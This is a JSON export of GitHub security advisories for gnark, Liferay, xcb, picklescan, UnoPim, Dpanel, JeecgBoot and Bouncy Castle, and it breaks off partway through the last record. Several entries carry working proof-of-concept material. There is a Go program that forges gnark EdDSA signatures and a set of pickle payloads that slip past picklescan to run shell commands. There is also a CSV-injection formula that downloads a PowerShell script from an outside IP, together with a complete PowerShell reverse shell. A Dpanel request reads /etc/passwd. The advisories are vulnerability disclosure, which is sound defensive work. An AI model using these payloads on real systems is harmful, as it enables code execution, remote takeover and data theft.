[
  {
    "ghsa_id": "GHSA-95v9-hv42-pwrj",
    "cve_id": "CVE-2025-57801",
    "severity": "high",
    "summary": "gnark is vulnerable to signature malleability in EdDSA and ECDSA due to missing scalar checks",
    "description": "In version before, `sig.s` used without asserting `0 \u2264 S < order` in `Verify function` in [eddsa.go](https://github.com/Consensys/gnark/blob/d9a42397979b05f95f21a601fd219b06a8d60b7b/std/signature/eddsa/eddsa.go) and [ecdsa.go](https://github.com/Consensys/gnark/blob/d9a42397979b05f95f21a601fd219b06a8d60b7b/std/signature/ecdsa/ecdsa.go), which will lead to *signature malleability* vulnerability. \n\n\n\n### Impact\n\nSince gnark\u2019s native EdDSA and ECDSA circuits lack essential constraints, multiple distinct witnesses can satisfy the same public inputs. In protocols where nullifiers or anti-replay checks are derived from `(R, S)`, this enables signature malleability and may lead to double spending.\n\n\n\n### Exploitation\n\n```go\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"fmt\"\n\t\"math/big\"\n\n\t\"github.com/consensys/gnark-crypto/ecc\"\n\tmimcHash \"github.com/consensys/gnark-crypto/ecc/bn254/fr/mimc\"\n\teddsaCrypto \"github.com/consensys/gnark-crypto/ecc/bn254/twistededwards/eddsa\"\n\n\t\"github.com/consensys/gnark/backend/groth16\"\n\t\"github.com/consensys/gnark/frontend\"\n\t\"github.com/consensys/gnark/frontend/cs/r1cs\"\n\t\"github.com/consensys/gnark/std/algebra/native/twistededwards\"\n\tstdMimc \"github.com/consensys/gnark/std/hash/mimc\"\n\tstdEddsa \"github.com/consensys/gnark/std/signature/eddsa\"\n\n\tte \"github.com/consensys/gnark-crypto/ecc/twistededwards\"\n)\n\n// Circuit\ntype eddsaCircuit struct {\n\tMsg frontend.Variable  `gnark:\",public\"`\n\tPk  stdEddsa.PublicKey `gnark:\",public\"`\n\tSig stdEddsa.Signature\n}\n\nfunc (c *eddsaCircuit) Define(api frontend.API) error {\n\tcurve, _ := twistededwards.NewEdCurve(api, te.BN254)\n\thasher, _ := stdMimc.NewMiMC(api)\n\tstdEddsa.Verify(curve, c.Sig, c.Msg, c.Pk, &hasher)\n\treturn nil\n}\n\nfunc groupOrder() *big.Int {\n\t// BN254 scalar field order (r)\n\tconst rStr = \"21888242871839275222246405745257275088548364400416034343698204186575808495617\"\n\tn, _ := new(big.Int).SetString(rStr, 10)\n\treturn n\n}\n\n// Forge signature: S \u2192 S + order\nfunc forge(sig eddsaCrypto.Signature) eddsaCrypto.Signature {\n\torder := groupOrder()\n\n\tvar forged eddsaCrypto.Signature\n\tforged.R = sig.R\n\n\ts := new(big.Int).SetBytes(sig.S[:])\n\ts.Add(s, order)\n\n\tbuf := make([]byte, 32)\n\tcopy(buf[32-len(s.Bytes()):], s.Bytes())\n\tcopy(forged.S[:], buf)\n\treturn forged\n}\n\nfunc main() {\n\t// Generate key pair\n\tpriv, _ := eddsaCrypto.GenerateKey(rand.Reader)\n\tpub := priv.PublicKey\n\tmsg := []byte(\"multi-witness\")\n\n\t// Create honest signature\n\th := mimcHash.NewMiMC()\n\th.Write(msg)\n\trawSig, _ := priv.Sign(msg, h)\n\n\tvar honest eddsaCrypto.Signature\n\thonest.SetBytes(rawSig)\n\tforged := forge(honest) // S + order\n\n\t// Setup: Compile circuit and do trusted setup\n\tcircuit := &eddsaCircuit{}\n\tccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, circuit)\n\tif err != nil {\n\t\tfmt.Printf(\"Circuit compilation failed: %v\\n\", err)\n\t\treturn\n\t}\n\n\tpk, vk, err := groth16.Setup(ccs)\n\tif err != nil {\n\t\tfmt.Printf(\"Trusted setup failed: %v\\n\", err)\n\t\treturn\n\t}\n\n\t// Public inputs (same for both witnesses)\n\tvar public eddsaCircuit\n\tpublic.Msg = new(big.Int).SetBytes(msg)\n\tpublic.Pk.Assign(te.BN254, pub.Bytes())\n\n\t// witness 1: honest signature\n\tw1 := public\n\tw1.Sig.Assign(te.BN254, honest.Bytes())\n\n\twitness1, err := frontend.NewWitness(&w1, ecc.BN254.ScalarField())\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to create witness1: %v\\n\", err)\n\t\treturn\n\t}\n\n\tproof1, err := groth16.Prove(ccs, pk, witness1)\n\tif err != nil {\n\t\tfmt.Println(\"Witness 1 (honest): Prover failed!\")\n\t} else {\n\t\tpublicWitness1, err := witness1.Public()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Witness 1 (honest): Prover failed!\")\n\t\t} else {\n\t\t\terr = groth16.Verify(proof1, vk, publicWitness1)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Witness 1 (honest): Prover failed!\")\n\t\t\t} else {\n\t\t\t\tfmt.Println(\"Witness 1 (honest): Prover succeeded!\")\n\t\t\t}\n\t\t}\n\t}\n\n\t// witness 2: forged signature\n\tw2 := public\n\tw2.Sig.Assign(te.BN254, forged.Bytes())\n\tfmt.Println(honest.R.Equal(&forged.R))\n\tfmt.Println(honest.S != forged.S)\n\n\twitness2, err := frontend.NewWitness(&w2, ecc.BN254.ScalarField())\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to create witness2: %v\\n\", err)\n\t\treturn\n\t}\n\n\tproof2, err := groth16.Prove(ccs, pk, witness2)\n\tif err != nil {\n\t\tfmt.Println(\"Witness 2 (forged): Prover failed!\")\n\t} else {\n\t\tpublicWitness2, err := witness2.Public()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Witness 2 (forged): Prover failed!\")\n\t\t} else {\n\t\t\terr = groth16.Verify(proof2, vk, publicWitness2)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Witness 2 (forged): Prover failed!\")\n\t\t\t} else {\n\t\t\t\tfmt.Println(\"Witness 2 (forged): Prover succeeded!\")\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### Result\n\n```bash\ngo run multiple_witnesses.go\n\n13:47:33 INF compiling circuit\n13:47:33 INF parsed circuit inputs nbPublic=3 nbSecret=3\n13:47:33 INF building constraint builder nbConstraints=7003\n13:47:33 DBG constraint system solver done nbConstraints=7003 took=2.696334\n13:47:33 DBG prover done acceleration=none backend=groth16 curve=bn254 nbConstraints=7003 took=44.164208\n13:47:33 DBG verifier done backend=groth16 curve=bn254 took=0.983583\nWitness 1 (honest): Prover succeeded!\ntrue\ntrue\n13:47:33 DBG constraint system solver done nbConstraints=7003 took=2.59125\n13:47:33 DBG prover done acceleration=none backend=groth16 curve=bn254 nbConstraints=7003 took=47.168709\n13:47:33 DBG verifier done backend=groth16 curve=bn254 took=0.995833\nWitness 2 (forged): Prover succeeded!\n```\n\n\n\n### Credits\n\nXlabAI Team of Tencent Xuanwu Lab\n\nSJTU Group of Software Security In Progress\n\nProf. Yu Yu's Lab at SJTU",
    "package_name": "github.com/consensys/gnark",
    "ecosystem": "go",
    "vulnerable_version_range": "< 0.14.0",
    "first_patched_version": "0.14.0",
    "published_at": "2025-08-22T20:58:21Z",
    "updated_at": "2025-08-23T01:28:12Z"
  },
  {
    "ghsa_id": "GHSA-fvqv-593q-qp8r",
    "cve_id": "CVE-2025-43760",
    "severity": "medium",
    "summary": "Liferay Portal Reflected Cross-Site Scripting Vulnerability via PortalUtil.escapeRedirect",
    "description": "A reflected cross-site scripting (XSS) vulnerability in the Liferay Portal 7.4.0 through 7.4.3.132, and Liferay DXP 2025.Q1.0 through 2025.Q1.4, 2024.Q4.0 through 2024.Q4.6, 2024.Q3.0 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.20 and 7.4 GA through update 92 allows an remote authenticated attacker to inject JavaScript into the PortalUtil.escapeRedirect",
    "package_name": "com.liferay.portal:release.portal.bom",
    "ecosystem": "maven",
    "vulnerable_version_range": ">= 7.4.0-ga1, <= 7.4.3.132-ga132",
    "first_patched_version": null,
    "published_at": "2025-08-22T18:31:24Z",
    "updated_at": "2025-08-22T21:09:46Z"
  },
  {
    "ghsa_id": "GHSA-xwc5-q44v-p6gg",
    "cve_id": "CVE-2025-43751",
    "severity": "medium",
    "summary": "Liferay Portal User Enumeration Vulnerability via the Create Account Page",
    "description": "User enumeration vulnerability in Liferay Portal 7.4.0 through 7.4.3.132, and Liferay DXP 2024.Q4.0 through 2024.Q4.7, 2024.Q3.0 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.14, 2023.Q4.0 through 2023.Q4.10, 2023.Q3.1 through 2023.Q3.10 and 7.4 GA through update 92 allows remote attackers to determine if an account exist in the application via the create account page.",
    "package_name": "com.liferay:com.liferay.login.web",
    "ecosystem": "maven",
    "vulnerable_version_range": "< 6.0.66",
    "first_patched_version": "6.0.66",
    "published_at": "2025-08-22T18:31:23Z",
    "updated_at": "2025-08-22T21:09:39Z"
  },
  {
    "ghsa_id": "GHSA-655h-hg88-5qmf",
    "cve_id": null,
    "severity": "low",
    "summary": "Rust XCB `xcb::Connection::connect_to_fd*` functions violate I/O safety",
    "description": "The API of `xcb::Connection` has constructors which allow an arbitrary `RawFd` to be used as a socket connection. On either failure of these constructors or on the drop of `Connection`, it closes the associated file descriptor. Thus, a program which uses an `OwnedFd` (such as a `UnixStream`) as the file descriptor can close the file descriptor and continue to attempt using it or close an already-closed file descriptor, violating I/O safety.\n\nStarting in version 1.6.0, `xcb` provides `Connection::connect_with_fd` and `Connection::connect_with_fd_and_extensions` as safe alternatives and deprecates the problematic functions.",
    "package_name": "xcb",
    "ecosystem": "rust",
    "vulnerable_version_range": "< 1.6.0",
    "first_patched_version": "1.6.0",
    "published_at": "2025-08-22T17:34:45Z",
    "updated_at": "2025-08-22T17:34:47Z"
  },
  {
    "ghsa_id": "GHSA-vv6j-3g6g-2pvj",
    "cve_id": null,
    "severity": "medium",
    "summary": "Picklescan missing detection when calling pytorch function torch.utils._config_module.load_config",
    "description": "### Summary\n\nUsing torch.utils._config_module.load_config function, which is a pytorch library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to torch.utils._config_module.load_config function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\nimport pickle\nfrom torch.utils._config_module import ConfigModule\n\nclass Evil:\n    def __reduce__(self):\n        return (os.system, ('whoami',))\n\nclass EvilTorchUtilsConfigModuleLoadConfig:\n    def __reduce__(self):\n        evil_payload = pickle.dumps(Evil())\n        return ConfigModule.load_config, (None, evil_payload)\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "package_name": "picklescan",
    "ecosystem": "pip",
    "vulnerable_version_range": "<= 0.0.27",
    "first_patched_version": "0.0.28",
    "published_at": "2025-08-22T16:58:14Z",
    "updated_at": "2025-08-22T16:58:15Z"
  },
  {
    "ghsa_id": "GHSA-vr7h-p6mm-wpmh",
    "cve_id": null,
    "severity": "medium",
    "summary": "Picklescan missing detection when calling pytorch function torch.jit.unsupported_tensor_ops.execWrapper",
    "description": "### Summary\n\nUsing torch.jit.unsupported_tensor_ops.execWrapper function, which is a pytorch library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to torch.jit.unsupported_tensor_ops.execWrapper function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\n\nimport torch.jit.unsupported_tensor_ops as unsupported_tensor_ops\n\nclass EvilTorchJitUnsupportedTensorOpsExecWrapper:\n    def __reduce__(self):\n        code = '__import__(\"os\").system(\"whoami\")'\n        glob = {}\n        loc = {}\n        return unsupported_tensor_ops.execWrapper, (code, glob, loc)\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "package_name": "picklescan",
    "ecosystem": "pip",
    "vulnerable_version_range": "<= 0.0.27",
    "first_patched_version": "0.0.28",
    "published_at": "2025-08-22T16:58:06Z",
    "updated_at": "2025-08-22T16:58:08Z"
  },
  {
    "ghsa_id": "GHSA-h3qp-7fh3-f8h4",
    "cve_id": null,
    "severity": "medium",
    "summary": "Picklescan missing detection when calling pytorch function torch.utils.data.datapipes.utils.decoder.basichandlers",
    "description": "### Summary\n\nUsing torch.utils.data.datapipes.utils.decoder.basichandlers function, which is a pytorch library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to torch.utils.data.datapipes.utils.decoder.basichandlers function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\nimport torch.utils.data.datapipes.utils.decoder as decoder\n\nclass EvilTorchUtilsDataDatapipesDecoder:\n    def __reduce__(self):\n        extension = 'pickle'\n        class RCE:\n            def __reduce__(self):\n                return os.system, ('whoami',)\n        data = pickle.dumps(RCE())\n        return decoder.basichandlers, (extension, data)\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "package_name": "picklescan",
    "ecosystem": "pip",
    "vulnerable_version_range": "<= 0.0.27",
    "first_patched_version": "0.0.28",
    "published_at": "2025-08-22T16:57:59Z",
    "updated_at": "2025-08-22T16:58:00Z"
  },
  {
    "ghsa_id": "GHSA-f745-w6jp-hpxx",
    "cve_id": null,
    "severity": "medium",
    "summary": "Picklescan missing detection when calling pytorch function torch.utils.collect_env.run",
    "description": "### Summary\n\nUsing torch.utils.collect_env.run function, which is a pytorch library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to torch.utils.collect_env.run function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\nimport torch.utils.collect_env as collect_env\n\nclass EvilTorchUtilsCollectEnvRun:\n    def __reduce__(self):\n        command = 'touch /tmp/collect_env_run_success'\n        return collect_env.run, (command,)\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "package_name": "picklescan",
    "ecosystem": "pip",
    "vulnerable_version_range": "<= 0.0.27",
    "first_patched_version": "0.0.28",
    "published_at": "2025-08-22T16:57:49Z",
    "updated_at": "2025-08-22T16:57:50Z"
  },
  {
    "ghsa_id": "GHSA-f4x7-rfwp-v3xw",
    "cve_id": null,
    "severity": "medium",
    "summary": "Picklescan missing detection when calling pytorch function torch.fx.experimental.symbolic_shapes.ShapeEnv.evaluate_guards_expression",
    "description": "### Summary\n\nUsing torch.fx.experimental.symbolic_shapes.ShapeEnv.evaluate_guards_expression function, which is a pytorch library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to torch.fx.experimental.symbolic_shapes.ShapeEnv.evaluate_guards_expression function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\nimport types\nimport torch.fx.experimental.symbolic_shapes as symbolic_shapes\n\nclass EvilTorchFxSymbolicShapesEvaluateGuardsExpression:\n    def __reduce__(self):\n        fake_self = str\n        code = \"__import__('os').system('whoami')\"\n        args = []\n        return symbolic_shapes.ShapeEnv.evaluate_guards_expression, (fake_self, code, args)\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "package_name": "picklescan",
    "ecosystem": "pip",
    "vulnerable_version_range": "<= 0.0.27",
    "first_patched_version": "0.0.28",
    "published_at": "2025-08-22T16:56:53Z",
    "updated_at": "2025-08-22T16:56:53Z"
  },
  {
    "ghsa_id": "GHSA-86cj-95qr-2p4f",
    "cve_id": null,
    "severity": "medium",
    "summary": "Picklescan missing detection when calling pytorch function torch._dynamo.guards.GuardBuilder.get",
    "description": "### Summary\n\nUsing torch._dynamo.guards.GuardBuilder.get function, which is a pytorch library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to torch._dynamo.guards.GuardBuilder.get function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\nimport types\nimport torch._dynamo.guards as guards\n\nclass EvilTorchDynamoGuardsGet:\n    def __reduce__(self):\n        fake_self = types.SimpleNamespace(scope={})\n        name = \"__import__('os').system('whoami')\"\n        return guards.GuardBuilder.get, (fake_self, name)\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "package_name": "picklescan",
    "ecosystem": "pip",
    "vulnerable_version_range": "<= 0.0.27",
    "first_patched_version": "0.0.28",
    "published_at": "2025-08-22T16:56:39Z",
    "updated_at": "2025-08-22T16:56:40Z"
  },
  {
    "ghsa_id": "GHSA-4r9r-ch6f-vxmx",
    "cve_id": null,
    "severity": "medium",
    "summary": "Picklescan missing detection when calling pytorch function torch.utils.bottleneck.__main__.run_cprofile",
    "description": "### Summary\n\nUsing torch.utils.bottleneck.__main__.run_cprofile\n function, which is a pytorch library function to execute remote pickle file.\n\n### Details\n\nThe attack payload executes in the following steps:\n\nFirst, the attacker craft the payload by calling to torch.utils.bottleneck.__main__.run_cprofile\n function in reduce method\nThen when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\nimport torch.utils.bottleneck.__main__ as bottleneck_main\n\nclass EvilTorchUtilsBottleneckRunCprofile:\n    def __reduce__(self):\n        code = '__import__(\"os\").system(\"whoami\")'\n        globs = {}\n        return bottleneck_main.run_cprofile, (code, globs)\n```\n\n### Impact\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nWhat is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu",
    "package_name": "picklescan",
    "ecosystem": "pip",
    "vulnerable_version_range": "<= 0.0.27",
    "first_patched_version": "0.0.28",
    "published_at": "2025-08-22T16:56:25Z",
    "updated_at": "2025-08-22T16:56:27Z"
  },
  {
    "ghsa_id": "GHSA-74rg-6f92-g6wx",
    "cve_id": "CVE-2025-55745",
    "severity": "low",
    "summary": "UnoPim has CSV Injection on Quick Export feature",
    "description": "### Summary\nDescription:\n`CSV Injection` or `Formula Injection` is a security vulnerability that occurs when malicious content is inserted into a CSV (Comma-Separated Values) file, which is then opened in a spreadsheet application like Microsoft Excel. This attack exploits the way spreadsheet software automatically interprets certain text patterns as formulas or commands, rather than plain text.\n\n### Details\nA basic test for CSV Injection is using `SUM()` to add two numbers or open calc.exe\u200b using\u200b\ncommand:\n `=cmd|' /C calc'!A0\u200b`\n\n\nThe same method can be used to run arbitrary code on the victim's machine.\nFor example the below code will download and execute a malicious script to create a reverse TCP connection to the attacker's machine.\n*Payload*:\n> This is our payload and will be used in the vulnerable field during exploitation\n```\n    =cmd|' /C powershell Invoke-WebRequest\n    \"http://52.172.182.242:7000/shell.ps1\" -OutFile \"$env:Temp\\shell.ps1\";\n    powershell -ExecutionPolicy Bypass -File \"$env:Temp\\shell.ps1\"'!A1\u200b\n```\n\n*shell.ps1*:\n```\n    $client = New-Object System.Net.Sockets.TCPClient('52.172.182.242',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u200b\n```\n\n### PoC:\n\n  1. Go to any product and click on Edit\n  2. Add the above discussed payload in any field that accept text for e.g. Product Number field.\n  3. Quick Export -> Select CSV, Open the csv, the formula will get executed during opening.\n\n> This could be injected by admin or any user that has privilege to edit products.\n> Also the CSRF Injection reported at product edit feature can be used as an attack vector to add such payloads.\n\n\nPlease note that if this is replicated on version starting from Office 2021:\nFollow these steps:\nGo to `File > Options > Trust Center > Trust Center Settings > External Content\u200b -> Enable Dynamic Data Exchange Server Launch\"`.\nThis is due to Office 2021 and Microsoft 365 have DDE disabled by default for enhanced security.\n\nPlatform Details:\nReplicated this on Office 2021 on Windows 11.\nPOC video link: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3\n\n### Impact\nWhen the victim opens the CSV, the injected formula which fetches a reverse shell script written in Powershell from attacker's server and executes it. This creates a reverse shell connection from victim's device to attacker's allowing an attacker to perform any action on the victim's device.\n\n### Recommendation:\n- Avoid starting values with Equals sign (=), Plus sign (+), Minus sign (-), At symbol (@), Tab (0x09), Carriage return (0x0D).\n- Sanitize the vulnerable field using regex or standard libraries.\n- Wrap the value around double quotes for fields that cannot be sanitized for some reason so that the value is considered as string instead of formula.",
    "package_name": "unopim/unopim",
    "ecosystem": "composer",
    "vulnerable_version_range": "<= 0.3.0",
    "first_patched_version": "0.3.1",
    "published_at": "2025-08-22T16:50:05Z",
    "updated_at": "2025-08-22T21:09:44Z"
  },
  {
    "ghsa_id": "GHSA-8p2f-fx4q-75cx",
    "cve_id": "CVE-2025-55741",
    "severity": "high",
    "summary": "UnoPim has Broken Access Control",
    "description": "### Summary\nIn Unopim, it is possible to create roles and choose the privileges. However, users without the \u201cDelete\u201d privilege for Products cannot delete a single product via the standard endpoint (expected behavior), but can still delete products via the mass-delete endpoint, even when the request contains only one product ID.\n\n**Severity**:\u00a0High CVSS Score 8.1 (CVSS 3.1 Vector:\u00a0[AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H&version=3.1))\n**Category**: Broken Access Control / Missing Authorization (OWASP A01:2021)\n**Impact**: Unauthorized product deletion -> data loss, possible business disruption\n\n### Affected Behavior\n**Single delete (enforced):**\n**DELETE** `/admin/catalog/products/{id}` returns 401 with \"This action is unauthorized\" for users lacking the Delete privilege.\n\n**Mass delete (not enforced):**\n**POST** `/admin/catalog/products/mass-delete` allows deletion without the Delete privilege. This occurs for both multiple IDs and a single ID submitted to the bulk endpoint.\n\n### PoC\nA video was captured in Burp Suite for a proof of concept. The cookies were used directly from Burp Suite and rendered the My Account page to prove what cookies belong to what users. The video PoC is listed in references.\n\n### Impact\nUnauthorized product deletion -> data loss, possible business disruption",
    "package_name": "unopim/unopim",
    "ecosystem": "composer",
    "vulnerable_version_range": "<= 0.3.0",
    "first_patched_version": "0.3.1",
    "published_at": "2025-08-22T16:49:55Z",
    "updated_at": "2025-08-22T21:08:50Z"
  },
  {
    "ghsa_id": "GHSA-gcqf-pxgg-gw8q",
    "cve_id": "CVE-2025-53363",
    "severity": "medium",
    "summary": "Dpanel has an arbitrary file read vulnerability",
    "description": "### Summary\nDpanel has an arbitrary file read vulnerability in the /api/app/compose/get-from-uri interface.Logged in to Dpanel ,this interface can be used to read arbitrary files.\n\n### Details\nWhen a user logs into the administrative backend, this interface can read any files on the host/sever (given the necessary permissions), which may lead to system information leakage. The vulnerability lies in the GetFromUri function within the app/application/http/controller/compose.go file. The uri parameter submitted by the user in JSON format can be directly read and returned by os.ReadFile without proper security handling.\n![image-20250702004157585](https://github.com/user-attachments/assets/1f0e683b-bf0b-49e6-8d68-833fcf3f214d)\n![image-20250702004223184](https://github.com/user-attachments/assets/b5e89e02-f572-4edf-aaa8-566dea090d3f)\n\n### PoC\n```text\nPOST /api/app/compose/get-from-uri HTTP/1.1\nHost: x.x.x.x\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nAuthorization: Bearer eyJ......lWg==\nConnection: close\nContent-Type: application/json\nContent-Length: 21\n\n{\"uri\":\"/etc/passwd\"}\n```\n\n### Impact\nThis vulnerability could lead to the leakage of sensitive server file information. In versions from 1.2.0 up to the latest (1.7.2), logged-in users can make requests to this interface.",
    "package_name": "github.com/donknap/dpanel",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 1.2.0, <= 1.7.2",
    "first_patched_version": null,
    "published_at": "2025-08-22T16:49:05Z",
    "updated_at": "2025-08-22T21:08:39Z"
  },
  {
    "ghsa_id": "GHSA-gj8w-ffq9-6828",
    "cve_id": "CVE-2025-51825",
    "severity": "medium",
    "summary": "JeecgBoot SQL Injection Vulnerability",
    "description": "JeecgBoot versions from 3.4.3 up to 3.8.0 were found to contain a SQL injection vulnerability in the /jeecg-boot/online/cgreport/head/parseSql endpoint, which allows bypassing SQL blacklist restrictions.",
    "package_name": "org.jeecgframework.boot:jeecg-boot-base-core",
    "ecosystem": "maven",
    "vulnerable_version_range": ">= 3.4.3, < 3.8.1",
    "first_patched_version": "3.8.1",
    "published_at": "2025-08-22T15:33:05Z",
    "updated_at": "2025-08-22T20:55:09Z"
  },
  {
    "ghsa_id": "GHSA-g6rx-6wfx-gj74",
    "cve_id": "CVE-2025-9340",
    "severity": "low",
    "summary": "Bouncy Castle for Java has Out-of-Bounds Write Vulnerability",
    "description": "Out-of-bounds Write vulnerability in Legion of the Bouncy Castle Inc. Bouncy Castle for Java bc-fips on All (API modules). This vulnerability is associated with program files org/bouncycastle/jcajce/provider/BaseCipher.\n\nThis issue affects Bouncy Castle for Java: from BC-FJA 2.1.0 through 2.1.0.",
    "package_name": "org.bouncycastle:bc-fips",
    "ecosystem": "maven",
    "vulnerable_version_range": "= 2.1.0",
    "first_patched_version": "2.1.1",
    "published_at": "2025-08-22T12:30:30Z",
    "updated_at": "2025-08-22T20:30:46Z"
  },
  {
    "ghsa_id": "GHSA-jfcv-jv9g-2vx2",
    "cve_id": "CVE-2025-9341",
    "severity": "medium",
    "summary": "Bouncy Castle for Java has Uncontrolled Resource Consumption Vulnerability",
    "description": "Uncontrolled Resource Consumption vulnerability in Legion of the Bouncy Castle Inc. Bouncy Castle for Java FIPS bc-fips on All (API modules) allows Excessive Allocation. This vulnerability is associated with program files org/bouncycastle/crypto/fips/AESNativeCBC.Java.\n\nThis issue affects Bouncy Castle for Java FIPS: from BC-FJA 2.1.0 through 2.1.0.",
    "package_name": "org.bouncycastle:bc-fips",
    "ecosystem": "maven",
    "vulnerable_version_range": "= 2.1.0",
    "first_patched_version": "2.1.1",
    "published_at": "2025-08-22T09:30:41Z",
    "updated_at": "2025-08-22T20:30:51Z"
  },
  {
    "ghsa_id": "GHSA-jfcv-jv9g-2vx2",
    "cve_id": "CVE-2025-9341",
    "severity": "medium",
    "summary": "Bouncy Castle for Java has Uncontrolled Resource Consumption Vulnerability",
    "description": "Uncontrolled Resource Consumption vulnerability in Legion of the Bouncy Castle Inc. Bouncy Castle for Java FIPS bc-fips on All (API modules) allows Excessive Allocation. This vulnerability is associated with program files org/bouncycastle/crypto/fips/AESNativeCBC.Java.\n\nThis issue affects Bouncy Castle for Java FIPS: from BC-FJA 2.1.0 through 2.1.0.",
    "package_name": "org.bouncycastle:bctls-fips",
    "ecosystem": "maven",
    "vulnerable_version_range": "= 2.73.7",
    "first_patched_version": "2.73.8",
    "published_at": "2025-08-22T09:30:41Z",
